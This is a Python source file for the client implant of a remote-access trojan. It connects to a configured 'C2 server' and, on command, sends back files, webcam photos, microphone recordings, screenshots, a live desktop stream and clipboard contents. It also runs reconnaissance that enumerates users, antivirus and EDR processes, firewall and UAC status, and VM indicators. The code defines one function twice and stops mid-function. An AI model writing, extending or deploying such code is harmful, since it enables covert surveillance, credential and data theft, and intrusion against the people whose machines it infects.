import asyncio
import websockets
import ssl
import getpass
import sys
import base64
import os
from pathlib import Path
from datetime import datetime

# ========== CONFIGURATION ==========
# For a self-hosted deployment, fill in these variables:
TARGET_ID = "machineA"
SERVER_HOST = "192.168.2.110"  # C2 server IP address
SERVER_PORT = 8765             # C2 server port

# Credentials - If these fields are filled in, the script runs without user interaction
AUTO_LOGIN = ""        # Example: "machineA"
AUTO_PASSWORD = ""     # Example: "TargetA_Pass123"
# ====================================

# Global clipboard history for monitoring
clipboard_history = []

DOWNLOAD_DIR = "downloads"  # Directory for files uploaded from the server

def ensure_download_dir():
    """Create the download directory if it does not exist"""
    Path(DOWNLOAD_DIR).mkdir(exist_ok=True)

async def handle_file_get(filepath: str) -> str:
    """
    Reads a file and returns the data encoded in Base64
    Return format: FILE_DATA:filename:base64_data or FILE_ERROR:message
    """
    try:
        # Try multiple path resolution strategies
        attempted_paths = []
        path = None
        
        # Strategy 1: If it starts with "downloads/", try relative to script directory
        if filepath.startswith("downloads/") or filepath.startswith("downloads\\"):
            # Get the directory where this script is located
            script_dir = Path(__file__).parent if '__file__' in globals() else Path.cwd()
            candidate = script_dir / filepath
            attempted_paths.append(str(candidate))
            if candidate.exists():
                path = candidate
        
        # Strategy 2: Try as relative path from current working directory
        if path is None:
            candidate = Path(filepath)
            attempted_paths.append(str(candidate.resolve()))
            if candidate.exists():
                path = candidate
        
        # Strategy 3: Try with expanduser for home directory paths
        if path is None and ('~' in filepath or filepath.startswith('/')):
            candidate = Path(filepath).expanduser()
            attempted_paths.append(str(candidate))
            if candidate.exists():
                path = candidate
        
        # Strategy 4: If filename only (no path separators), check in DOWNLOAD_DIR
        if path is None and ('/' not in filepath and '\\' not in filepath):
            script_dir = Path(__file__).parent if '__file__' in globals() else Path.cwd()
            candidate = script_dir / DOWNLOAD_DIR / filepath
            attempted_paths.append(str(candidate))
            if candidate.exists():
                path = candidate
        
        if path is None or not path.exists():
            tried = '\n  '.join(attempted_paths)
            return f"FILE_ERROR:File not found. Tried:\n  {tried}"
        
        if not path.is_file():
            return f"FILE_ERROR:Not a file: {path}"
        
        # Size limit (10MB)
        if path.stat().st_size > 10 * 1024 * 1024:
            return f"FILE_ERROR:File too large (max 10MB): {path}"
        
        with open(path, 'rb') as f:
            file_data = f.read()
        
        b64_data = base64.b64encode(file_data).decode('utf-8')
        filename = path.name
        
        return f"FILE_DATA:{filename}:{b64_data}"
    
    except PermissionError:
        return f"FILE_ERROR:Permission denied: {filepath}"
    except Exception as e:
        return f"FILE_ERROR:{str(e)}"

async def handle_file_put(filename: str, b64_data: str) -> str:
    """
    Save a file received from the server
    Return format: FILE_OK:message or FILE_ERROR:message
    """
    try:
        ensure_download_dir()
        
        # Decoding the data
        file_data = base64.b64decode(b64_data)
        
        # Create a safe path
        safe_filename = Path(filename).name  # Remove paths
        filepath = Path(DOWNLOAD_DIR) / safe_filename
        
        # Saving
        with open(filepath, 'wb') as f:
            f.write(file_data)
        
        size_kb = len(file_data) / 1024
        return f"FILE_OK:Saved {filename} ({size_kb:.2f} KB) → {filepath}"
    
    except Exception as e:
        return f"FILE_ERROR:{str(e)}"

async def capture_webcam() -> str:
    """
    Captures a photo from the webcam
    Return format: WEBCAM_DATA:filename:base64_data or WEBCAM_ERROR:message
    """
    try:
        import cv2
        import base64
        from datetime import datetime
        
        # Ensure downloads directory exists
        ensure_download_dir()
        
        # Initialize webcam
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            return "WEBCAM_ERROR:No webcam detected or camera is in use"
        
        # Capture frame
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            return "WEBCAM_ERROR:Failed to capture frame"
        
        # Save to file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"webcam_{timestamp}.jpg"
        filepath = Path(DOWNLOAD_DIR) / filename
        
        cv2.imwrite(str(filepath), frame)
        
        # Read and encode
        with open(filepath, 'rb') as f:
            img_data = f.read()
        
        b64_data = base64.b64encode(img_data).decode('utf-8')
        
        return f"WEBCAM_DATA:{filename}:{b64_data}"
    
    except ImportError:
        return "WEBCAM_ERROR:OpenCV not installed (pip install opencv-python)"
    except Exception as e:
        return f"WEBCAM_ERROR:{str(e)}"


# ============ Screenshot Capture ============
async def capture_screenshot() -> str:
    """
    Captures a screenshot of the desktop
    Return format: SCREENSHOT_DATA:filename:base64_data or SCREENSHOT_ERROR:message
    """
    try:
        import base64
        from datetime import datetime
        from pathlib import Path
        
        # Try different screenshot libraries based on OS
        try:
            # Try pillow + mss (fastest, cross-platform)
            import mss
            import mss.tools
            from PIL import Image
            import io
            
            # Ensure downloads directory exists
            ensure_download_dir()
            
            # Capture screenshot
            with mss.mss() as sct:
                # Capture all monitors as one screenshot
                monitor = sct.monitors[0]  # 0 = all monitors combined
                screenshot = sct.grab(monitor)
                
                # Convert to PIL Image
                img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
                
                # Save to file
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"screenshot_{timestamp}.png"
                filepath = Path(DOWNLOAD_DIR) / filename
                
                img.save(filepath, 'PNG')
                
                # Read and encode
                with open(filepath, 'rb') as f:
                    img_data = f.read()
                
                b64_data = base64.b64encode(img_data).decode('utf-8')
                
                return f"SCREENSHOT_DATA:{filename}:{b64_data}"
                
        except ImportError:
            # Fallback to PIL ImageGrab (Windows/macOS)
            try:
                from PIL import ImageGrab
                
                ensure_download_dir()
                
                # Capture screenshot
                img = ImageGrab.grab()
                
                # Save to file
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"screenshot_{timestamp}.png"
                filepath = Path(DOWNLOAD_DIR) / filename
                
                img.save(filepath, 'PNG')
                
                # Read and encode
                with open(filepath, 'rb') as f:
                    img_data = f.read()
                
                b64_data = base64.b64encode(img_data).decode('utf-8')
                
                return f"SCREENSHOT_DATA:{filename}:{b64_data}"
                
            except:
                return "SCREENSHOT_ERROR:No screenshot library available. Install: pip install mss pillow"
    
    except Exception as e:
        return f"SCREENSHOT_ERROR:{str(e)}"


# ============ Desktop Streaming ============
class DesktopStreamer:
    """Manages desktop streaming state"""
    def __init__(self):
        self.streaming = False
        self.stream_task = None
        self.websocket = None
    
    async def start_stream(self, websocket):
        """Start desktop streaming"""
        if self.streaming:
            return "STREAM_ERROR:Stream already running"
        
        self.streaming = True
        self.websocket = websocket
        self.stream_task = asyncio.create_task(self._stream_loop())
        
        return "STREAM_STARTED:Desktop stream initiated"
    
    async def stop_stream(self):
        """Stop desktop streaming"""
        if not self.streaming:
            return "STREAM_ERROR:No stream running"
        
        self.streaming = False
        if self.stream_task:
            self.stream_task.cancel()
            try:
                await self.stream_task
            except asyncio.CancelledError:
                pass
        
        return "STREAM_STOPPED:Desktop stream ended"
    
    async def _stream_loop(self):
        """Continuous screenshot streaming loop"""
        try:
            import base64
            import time
            
            # Try to use mss for performance
            try:
                import mss
                from PIL import Image
                import io
                
                with mss.mss() as sct:
                    monitor = sct.monitors[0]
                    frame_count = 0
                    
                    while self.streaming:
                        try:
                            # Capture screenshot
                            screenshot = sct.grab(monitor)
                            
                            # Convert to PIL and compress
                            img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
                            
                            # Resize for bandwidth (optional - can be removed for full quality)
                            img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                            
                            # Compress to JPEG
                            buffer = io.BytesIO()
                            img.save(buffer, format='JPEG', quality=60)
                            img_data = buffer.getvalue()
                            
                            # Encode and send
                            b64_data = base64.b64encode(img_data).decode('utf-8')
                            
                            frame_count += 1
                            await self.websocket.send(f"STREAM_FRAME:{frame_count}:{b64_data}")
                            
                            # Control frame rate (~5 FPS for bandwidth)
                            await asyncio.sleep(0.2)
                            
                        except Exception as e:
                            print(f"[STREAM] Frame error: {e}")
                            await asyncio.sleep(1)
                            
            except ImportError:
                # Fallback to PIL ImageGrab
                from PIL import ImageGrab
                import io
                
                frame_count = 0
                
                while self.streaming:
                    try:
                        # Capture screenshot
                        img = ImageGrab.grab()
                        
                        # Resize for bandwidth
                        img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                        
                        # Compress to JPEG
                        buffer = io.BytesIO()
                        img.save(buffer, format='JPEG', quality=60)
                        img_data = buffer.getvalue()
                        
                        # Encode and send
                        b64_data = base64.b64encode(img_data).decode('utf-8')
                        
                        frame_count += 1
                        await self.websocket.send(f"STREAM_FRAME:{frame_count}:{b64_data}")
                        
                        # Control frame rate
                        await asyncio.sleep(0.2)
                        
                    except Exception as e:
                        print(f"[STREAM] Frame error: {e}")
                        await asyncio.sleep(1)
                        
        except asyncio.CancelledError:
            print("[STREAM] Stream cancelled")
        except Exception as e:
            print(f"[STREAM] Stream error: {e}")
            if self.websocket:
                try:
                    await self.websocket.send(f"STREAM_ERROR:{str(e)}")
                except:
                    pass

# Global streamer instance
desktop_streamer = DesktopStreamer()


async def capture_webcam() -> str:
    """
    Take a photo using the webcam
    Return format: WEBCAM_DATA:filename:base64_data or WEBCAM_ERROR:message
    """
    try:
        # Try importing cv2
        try:
            import cv2
        except ImportError:
            return "WEBCAM_ERROR:OpenCV not installed. Install with: pip install opencv-python"
        
        # Initialize webcam
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            return "WEBCAM_ERROR:Cannot access webcam"
        
        # Capture frame
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            return "WEBCAM_ERROR:Failed to capture frame"
        
        # Encode to JPEG
        ret, buffer = cv2.imencode('.jpg', frame)
        if not ret:
            return "WEBCAM_ERROR:Failed to encode image"
        
        # Convert to base64
        b64_data = base64.b64encode(buffer).decode('utf-8')
        
        # Generate filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"webcam_{timestamp}.jpg"
        
        return f"WEBCAM_DATA:{filename}:{b64_data}"
    
    except Exception as e:
        return f"WEBCAM_ERROR:{str(e)}"

async def record_audio(duration: int) -> str:
    """
    Records audio through the microphone
    Return format: AUDIO_DATA:filename:base64_data or AUDIO_ERROR:message
    """
    try:
        # Try importing sounddevice and scipy
        try:
            import sounddevice as sd
            import scipy.io.wavfile as wav
            import numpy as np
        except ImportError:
            return "AUDIO_ERROR:Audio libraries not installed. Install with: pip install sounddevice scipy numpy"
        
        # Validate duration
        if duration <= 0 or duration > 300:  # Max 5 minutes
            return "AUDIO_ERROR:Duration must be between 1 and 300 seconds"
        
        # Recording parameters
        sample_rate = 44100  # 44.1kHz
        
        # Record audio
        print(f"[AUDIO] Recording {duration} seconds...")
        recording = sd.rec(int(duration * sample_rate), 
                          samplerate=sample_rate, 
                          channels=2, 
                          dtype='int16')
        sd.wait()  # Wait until recording is finished
        
        # Save to temporary file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"audio_{timestamp}.wav"
        temp_path = f"/tmp/{filename}" if os.name != 'nt' else f"C:\\Windows\\Temp\\{filename}"
        
        wav.write(temp_path, sample_rate, recording)
        
        # Read and encode
        with open(temp_path, 'rb') as f:
            audio_data = f.read()
        
        # Clean up temp file
        try:
            os.remove(temp_path)
        except:
            pass
        
        # Encode to base64
        b64_data = base64.b64encode(audio_data).decode('utf-8')
        
        return f"AUDIO_DATA:{filename}:{b64_data}"
    
    except Exception as e:
        return f"AUDIO_ERROR:{str(e)}"

async def search_files(pattern: str, search_content: bool = False, content_pattern: str = "", max_results: int = 100) -> str:
    """
    Search for files by name or content
    Return format: SEARCH_RESULTS:count:results_json or SEARCH_ERROR:message
    """
    try:
        import fnmatch
        import json
        
        results = []
        count = 0
        
        # Specify the source directory
        if os.name == 'nt':
            start_paths = ['C:\\Users', 'C:\\Documents and Settings']
        else:
            start_paths = [os.path.expanduser('~'), '/etc', '/var', '/opt']
        
        # Search by filename
        if not search_content:
            for start_path in start_paths:
                if not os.path.exists(start_path):
                    continue
                    
                for root, dirs, files in os.walk(start_path):
                    # Avoid certain directories
                    dirs[:] = [d for d in dirs if d not in ['.git', 'node_modules', '__pycache__', '.cache']]
                    
                    for filename in files:
                        if fnmatch.fnmatch(filename.lower(), pattern.lower()):
                            filepath = os.path.join(root, filename)
                            try:
                                size = os.path.getsize(filepath)
                                results.append({
                                    'path': filepath,
                                    'size': size,
                                    'filename': filename
                                })
                                count += 1
                                
                                if count >= max_results:
                                    break
                            except (PermissionError, OSError):
                                continue
                    
                    if count >= max_results:
                        break
        
        # Search content
        else:
            for start_path in start_paths:
                if not os.path.exists(start_path):
                    continue
                    
                for root, dirs, files in os.walk(start_path):
                    dirs[:] = [d for d in dirs if d not in ['.git', 'node_modules', '__pycache__', '.cache']]
                    
                    for filename in files:
                        # Search only in text files
                        if not filename.endswith(('.txt', '.log', '.conf', '.config', '.ini', '.xml', '.json', '.py', '.sh', '.bat', '.cmd')):
                            continue
                        
                        filepath = os.path.join(root, filename)
                        try:
                            # Size limit to avoid reading very large files
                            if os.path.getsize(filepath) > 10 * 1024 * 1024:  # 10MB max
                                continue
                            
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if content_pattern.lower() in content.lower():
                                    # Find the line
                                    for i, line in enumerate(content.split('\n'), 1):
                                        if content_pattern.lower() in line.lower():
                                            results.append({
                                                'path': filepath,
                                                'line': i,
                                                'content': line.strip()[:100]  # Limit set to 100 chars
                                            })
                                            count += 1
                                            break
                            
                            if count >= max_results:
                                break
                        except (PermissionError, OSError, UnicodeDecodeError):
                            continue
                    
                    if count >= max_results:
                        break
        
        results_json = json.dumps(results)
        return f"SEARCH_RESULTS:{count}:{results_json}"
    
    except Exception as e:
        return f"SEARCH_ERROR:{str(e)}"

async def gather_sysinfo() -> str:
    """
    Collects comprehensive system information
    Return format: SYSINFO_DATA:info_json or SYSINFO_ERROR:message
    """
    try:
        import platform
        import socket
        import json
        import subprocess
        import time
        
        info = {}
        os_type = platform.system()
        
        # ============ SYSTEM INFORMATION ============
        info['system'] = {
            'os': os_type,
            'os_version': platform.version(),
            'os_release': platform.release(),
            'hostname': socket.gethostname(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'platform': platform.platform()
        }
        
        # Uptime
        try:
            if os_type == 'Windows':
                import ctypes
                uptime_ms = ctypes.windll.kernel32.GetTickCount64()
                uptime_sec = uptime_ms / 1000
            else:
                with open('/proc/uptime', 'r') as f:
                    uptime_sec = float(f.readline().split()[0])
            
            days = int(uptime_sec // 86400)
            hours = int((uptime_sec % 86400) // 3600)
            minutes = int((uptime_sec % 3600) // 60)
            info['system']['uptime'] = f"{days}d {hours}h {minutes}m"
            info['system']['uptime_seconds'] = int(uptime_sec)
        except:
            info['system']['uptime'] = 'Unknown'
        
        # ============ CURRENT USER ============
        info['user'] = {
            'username': os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
            'home': os.getenv('HOME') or os.getenv('USERPROFILE') or 'unknown'
        }
        
        # Check if admin/root
        try:
            if os_type == 'Windows':
                import ctypes
                info['user']['is_admin'] = bool(ctypes.windll.shell32.IsUserAnAdmin())
            else:
                info['user']['is_admin'] = (os.geteuid() == 0)
        except:
            info['user']['is_admin'] = False
        
        # ============ ALL USERS (OS-specific) ============
        info['users'] = {}
        
        if os_type == 'Windows':
            try:
                # Get local users via net user command
                result = subprocess.run(['net', 'user'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    users_list = []
                    lines = result.stdout.split('\n')
                    
                    # Find the section with users (between header and footer)
                    in_user_section = False
                    for line in lines:
                        line_stripped = line.strip()
                        
                        # Start of user section (after dashes)
                        if line_stripped.startswith('---'):
                            in_user_section = True
                            continue
                        
                        # End of user section (empty line or "The command completed")
                        if in_user_section and (not line_stripped or 
                                               'command completed' in line_stripped.lower() or
                                               'la commande' in line_stripped.lower()):
                            break
                        
                        # Parse user lines
                        if in_user_section and line_stripped:
                            # Users are in columns, split by whitespace
                            potential_users = line_stripped.split()
                            for user in potential_users:
                                # Filter out non-username strings
                                if user and len(user) > 1 and not user.startswith('-'):
                                    users_list.append(user)
                    
                    # Remove duplicates and common false positives
                    users_list = list(dict.fromkeys(users_list))  # Remove duplicates while preserving order
                    info['users']['local_users'] = users_list
                    info['users']['count'] = len(users_list)
            except:
                pass
            
            # Check current user groups
            try:
                result = subprocess.run(['whoami', '/groups'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    groups = []
                    for line in result.stdout.split('\n'):
                        if 'BUILTIN\\Administrators' in line or 'Administrators' in line:
                            groups.append('Administrators')
                        elif 'Remote Desktop Users' in line:
                            groups.append('Remote Desktop Users')
                    info['user']['groups'] = groups
            except:
                pass
        
        else:  # Linux/macOS
            try:
                # Parse /etc/passwd
                with open('/etc/passwd', 'r') as f:
                    passwd_lines = f.readlines()
                
                users_list = []
                for line in passwd_lines:
                    parts = line.strip().split(':')
                    if len(parts) >= 7:
                        username = parts[0]
                        uid = parts[2]
                        shell = parts[6]
                        # Only include users with interactive shells or uid < 1000
                        if '/bin/bash' in shell or '/bin/sh' in shell or '/bin/zsh' in shell:
                            users_list.append({
                                'name': username,
                                'uid': uid,
                                'shell': shell
                            })
                
                info['users']['local_users'] = users_list
                info['users']['count'] = len(users_list)
                
                # Get current user groups
                result = subprocess.run(['groups'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    info['user']['groups'] = result.stdout.strip().split()
            except:
                pass
        
        # ============ NETWORK INFORMATION ============
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            info['network'] = {
                'hostname': hostname,
                'local_ip': local_ip
            }
            
            # Get all network interfaces
            if os_type != 'Windows':
                try:
                    result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        info['network']['interfaces_detail'] = 'Available'
                except:
                    pass
            
            # Active connections
            try:
                if os_type == 'Windows':
                    result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=10)
                else:
                    result = subprocess.run(['netstat', '-tuln'], capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0:
                    listening_ports = []
                    for line in result.stdout.split('\n'):
                        if 'LISTENING' in line or 'LISTEN' in line:
                            parts = line.split()
                            if len(parts) > 1:
                                listening_ports.append(parts[1])
                    
                    info['network']['listening_ports'] = listening_ports[:10]  # First 10
                    info['network']['listening_count'] = len(listening_ports)
            except:
                pass
            
        except:
            info['network'] = {'error': 'Unable to get network info'}
        
        # ============ SECURITY INFORMATION ============
        info['security'] = {}
        
        if os_type == 'Windows':
            # Antivirus status
            try:
                result = subprocess.run(['powershell', '-Command', 'Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0 and 'True' in result.stdout:
                    info['security']['antivirus'] = 'Windows Defender (Enabled)'
                else:
                    info['security']['antivirus'] = 'Windows Defender (Status Unknown)'
            except:
                info['security']['antivirus'] = 'Unknown'
            
            # Firewall status
            try:
                result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles', 'state'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    if 'ON' in result.stdout or 'State' in result.stdout:
                        info['security']['firewall'] = 'Enabled'
                    else:
                        info['security']['firewall'] = 'Disabled'
            except:
                info['security']['firewall'] = 'Unknown'
            
            # UAC status
            try:
                result = subprocess.run(['reg', 'query', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'EnableLUA'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0 and '0x1' in result.stdout:
                    info['security']['uac'] = 'Enabled'
                else:
                    info['security']['uac'] = 'Disabled'
            except:
                info['security']['uac'] = 'Unknown'
        
        else:  # Linux/macOS
            # Check firewall
            try:
                if os_type == 'Linux':
                    # Try ufw
                    result = subprocess.run(['ufw', 'status'], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        info['security']['firewall'] = 'ufw: ' + ('Active' if 'active' in result.stdout.lower() else 'Inactive')
                    else:
                        # Try iptables
                        result = subprocess.run(['iptables', '-L'], capture_output=True, text=True, timeout=5)
                        info['security']['firewall'] = 'iptables: ' + ('Rules exist' if result.returncode == 0 else 'Unknown')
                elif os_type == 'Darwin':  # macOS
                    result = subprocess.run(['defaults', 'read', '/Library/Preferences/com.apple.alf', 'globalstate'], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        state = result.stdout.strip()
                        info['security']['firewall'] = 'Enabled' if state != '0' else 'Disabled'
            except:
                info['security']['firewall'] = 'Unknown'
            
            # SELinux (Linux only)
            if os_type == 'Linux':
                try:
                    result = subprocess.run(['getenforce'], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        info['security']['selinux'] = result.stdout.strip()
                except:
                    pass
        
        # ============ PROCESSES (Top security-related) ============
        info['processes'] = {}
        
        try:
            if os_type == 'Windows':
                result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=10)
            else:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                info['processes']['total'] = len(lines) - 1
                
                # Look for security processes
                security_procs = []
                security_keywords = ['defender', 'antivirus', 'firewall', 'security', 'crowdstrike', 
                                   'sentinelone', 'carbonblack', 'mcafee', 'symantec', 'kaspersky']
                
                for line in lines:
                    line_lower = line.lower()
                    for keyword in security_keywords:
                        if keyword in line_lower:
                            security_procs.append(line.strip()[:80])  # Limit length
                            break
                
                if security_procs:
                    info['processes']['security_related'] = security_procs[:5]  # Top 5
        except:
            pass
        
        # ============ INSTALLED SOFTWARE ============
        info['software'] = {}
        
        if os_type == 'Windows':
            try:
                # Check common software via registry or file system
                common_paths = [
                    ('C:\\Program Files\\Google\\Chrome', 'Google Chrome'),
                    ('C:\\Program Files\\Mozilla Firefox', 'Mozilla Firefox'),
                    ('C:\\Program Files\\7-Zip', '7-Zip'),
                    ('C:\\Program Files\\Microsoft Office', 'Microsoft Office'),
                    ('C:\\Program Files\\Python', 'Python'),
                    ('C:\\Program Files\\Java', 'Java'),
                ]
                
                installed = []
                for path, name in common_paths:
                    if os.path.exists(path):
                        installed.append(name)
                
                if installed:
                    info['software']['detected'] = installed
            except:
                pass
        
        else:  # Linux
            try:
                # Try dpkg (Debian/Ubuntu)
                result = subprocess.run(['dpkg', '-l'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    info['software']['package_manager'] = 'dpkg'
                    info['software']['package_count'] = len(result.stdout.split('\n')) - 5
                else:
                    # Try rpm (RedHat/CentOS)
                    result = subprocess.run(['rpm', '-qa'], capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        info['software']['package_manager'] = 'rpm'
                        info['software']['package_count'] = len(result.stdout.split('\n'))
            except:
                pass
        
        # ============ STORAGE ============
        if os_type == 'Windows':
            try:
                import ctypes
                drives = []
                bitmask = ctypes.windll.kernel32.GetLogicalDrives()
                for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                    if bitmask & 1:
                        drive = f"{letter}:\\"
                        try:
                            free_bytes = ctypes.c_ulonglong(0)
                            total_bytes = ctypes.c_ulonglong(0)
                            ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                                ctypes.c_wchar_p(drive),
                                None,
                                ctypes.pointer(total_bytes),
                                ctypes.pointer(free_bytes)
                            )
                            drives.append({
                                'drive': letter,
                                'total_gb': round(total_bytes.value / (1024**3), 2),
                                'free_gb': round(free_bytes.value / (1024**3), 2)
                            })
                        except:
                            pass
                    bitmask >>= 1
                info['storage'] = drives
            except:
                info['storage'] = {'error': 'Unable to get storage info'}
        
        else:  # Linux/macOS
            try:
                import shutil
                total, used, free = shutil.disk_usage('/')
                info['storage'] = [{
                    'mount': '/',
                    'total_gb': round(total / (1024**3), 2),
                    'used_gb': round(used / (1024**3), 2),
                    'free_gb': round(free / (1024**3), 2)
                }]
            except:
                info['storage'] = {'error': 'Unable to get storage info'}
        
        # ============ DOMAIN INFORMATION (Windows only) ============
        if os_type == 'Windows':
            info['domain'] = {}
            try:
                # Check if domain joined
                result = subprocess.run(['systeminfo'], capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'Domain:' in line:
                            domain = line.split(':', 1)[1].strip()
                            info['domain']['name'] = domain
                            info['domain']['is_joined'] = domain.lower() != 'workgroup'
                            break
            except:
                pass
        
        # ============ VIRTUALIZATION DETECTION ============
        info['virtualization'] = {}
        
        try:
            # Check for VM indicators
            vm_indicators = {
                'vmware': ['vmware', 'vmx'],
                'virtualbox': ['vbox', 'virtualbox'],
                'hyper-v': ['hyper-v', 'microsoft virtual'],
                'kvm': ['qemu', 'kvm'],
                'xen': ['xen']
            }
            
            system_info = platform.platform().lower()
            detected = False
            
            for vm_type, keywords in vm_indicators.items():
                for keyword in keywords:
                    if keyword in system_info:
                        info['virtualization']['type'] = vm_type
                        info['virtualization']['detected'] = True
                        detected = True
                        break
                if detected:
                    break
            
            if not detected:
                # Check via additional methods
                if os_type == 'Linux':
                    try:
                        with open('/proc/cpuinfo', 'r') as f:
                            cpuinfo = f.read().lower()
                            for vm_type, keywords in vm_indicators.items():
                                for keyword in keywords:
                                    if keyword in cpuinfo:
                                        info['virtualization']['type'] = vm_type
                                        info['virtualization']['detected'] = True
                                        detected = True
                                        break
                    except:
                        pass
            
            if not detected:
                info['virtualization']['detected'] = False
        except:
            pass
        
        # ============ SCHEDULED TASKS (Sample) ============
        info['scheduled_tasks'] = {}
        
        if os_type == 'Windows':
            try:
                result = subprocess.run(['schtasks', '/query', '/fo', 'LIST'], 
                                      capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    tasks = []
                    for line in result.stdout.split('\n'):
                        if 'TaskName:' in line:
                            task_name = line.split(':', 1)[1].strip()
                            # Filter out Microsoft tasks, keep interesting ones
                            if not task_name.startswith('\\Microsoft\\'):
                                tasks.append(task_name)
                    
                    info['scheduled_tasks']['user_tasks'] = tasks[:10]  # First 10
                    info['scheduled_tasks']['count'] = len(tasks)
            except:
                pass
        
        else:  # Linux/macOS
            try:
                # Check user crontab
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    cron_lines = [line for line in result.stdout.split('\n') if line and not line.startswith('#')]
                    info['scheduled_tasks']['crontab'] = cron_lines[:5]  # First 5
            except:
                pass
        
        # ============ ENVIRONMENT VARIABLES (Filtered) ============
        interesting_vars = ['PATH', 'TEMP', 'TMP', 'APPDATA', 'LOCALAPPDATA', 
                           'PROGRAMFILES', 'SYSTEMROOT', 'PYTHONPATH', 'JAVA_HOME',
                           'HOME', 'USER', 'SHELL', 'LANG']
        env_vars = {}
        for var in interesting_vars:
            val = os.getenv(var)
            if val:
                # Truncate very long values
                env_vars[var] = val[:200] if len(val) > 200 else val
        info['environment'] = env_vars
        
        # Convert to JSON
        info_json = json.dumps(info, indent=2)
        return f"SYSINFO_DATA:{info_json}"
    
    except Exception as e:
        return f"SYSINFO_ERROR:{str(e)}"

async def monitor_clipboard(action: str) -> str:
    """
    Clipboard management (get/set)
    Return format: CLIPBOARD_DATA:content or CLIPBOARD_ERROR:message
    """
    try:
        # Try importing clipboard library
        try:
            import pyperclip
        except ImportError:
            return "CLIPBOARD_ERROR:Clipboard library not installed. Install with: pip install pyperclip"
        
        if action == "get":
            # Wrap in asyncio to add timeout
            try:
                # Run in executor with timeout to prevent hanging
                import asyncio
                import concurrent.futures
                
                def read_clipboard():
                    return pyperclip.paste()
                
                loop = asyncio.get_event_loop()
                executor = concurrent.futures.ThreadPoolExecutor(max_workers=1)
                
                try:
                    content = await asyncio.wait_for(
                        loop.run_in_executor(executor, read_clipboard),
                        timeout=5.0
                    )
                except asyncio.TimeoutError:
                    return "CLIPBOARD_ERROR:Clipboard read timeout. System may be headless or missing clipboard dependencies (xclip/xsel on Linux)"
                finally:
                    executor.shutdown(wait=False)
                
                # Encode in Base64 to avoid issues with special characters
                b64_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
                return f"CLIPBOARD_DATA:{b64_content}"
                
            except Exception as e:
                return f"CLIPBOARD_ERROR:Failed to read clipboard: {str(e)}"
        
        elif action.startswith("set:"):
            # Format: set:base64_content
            try:
                b64_content = action[4:]
                content = base64.b64decode(b64_content).decode('utf-8')
                
                # Wrap in asyncio to add timeout
                import asyncio
                import concurrent.futures
                
                def write_clipboard(text):
                    pyperclip.copy(text)
                
                loop = asyncio.get_event_loop()
                executor = concurrent.futures.ThreadPoolExecutor(max_workers=1)
                
                try:
                    await asyncio.wait_for(
                        loop.run_in_executor(executor, write_clipboard, content),
                        timeout=5.0
                    )
                except asyncio.TimeoutError:
                    return "CLIPBOARD_ERROR:Clipboard write timeout. System may be headless or missing clipboard dependencies"
                finally:
                    executor.shutdown(wait=False)
                
                return "CLIPBOARD_OK:Clipboard updated"
                
            except Exception as e:
                return f"CLIPBOARD_ERROR:Failed to set clipboard: {str(e)}"
        
        else:
            return "CLIPBOARD_ERROR:Invalid action. Use 'get' or 'set:content'"
    
    except Exception as e:
        return f"CLIPBOARD_ERROR:{str(e)}"

async def start_clipboard_monitor(websocket, duration: int = None) -> str:
    """
    Monitor clipboard continuously and report all changes
    Stores history in global clipboard_history for polling
    Format: CLIPBOARD_MONITOR:start:duration (in seconds)
    """
    try:
        # Try importing clipboard library
        try:
            import pyperclip
        except ImportError:
            return "CLIPBOARD_MONITOR_ERROR:Clipboard library not installed. Install with: pip install pyperclip"
        
        from datetime import datetime
        
        # Access global clipboard history (already initialized at module level)
        global clipboard_history
        
        # Send start confirmation
        await websocket.send(f"CLIPBOARD_MONITOR_START:{duration}")
        
        last_content = ""
        start_time = datetime.now()
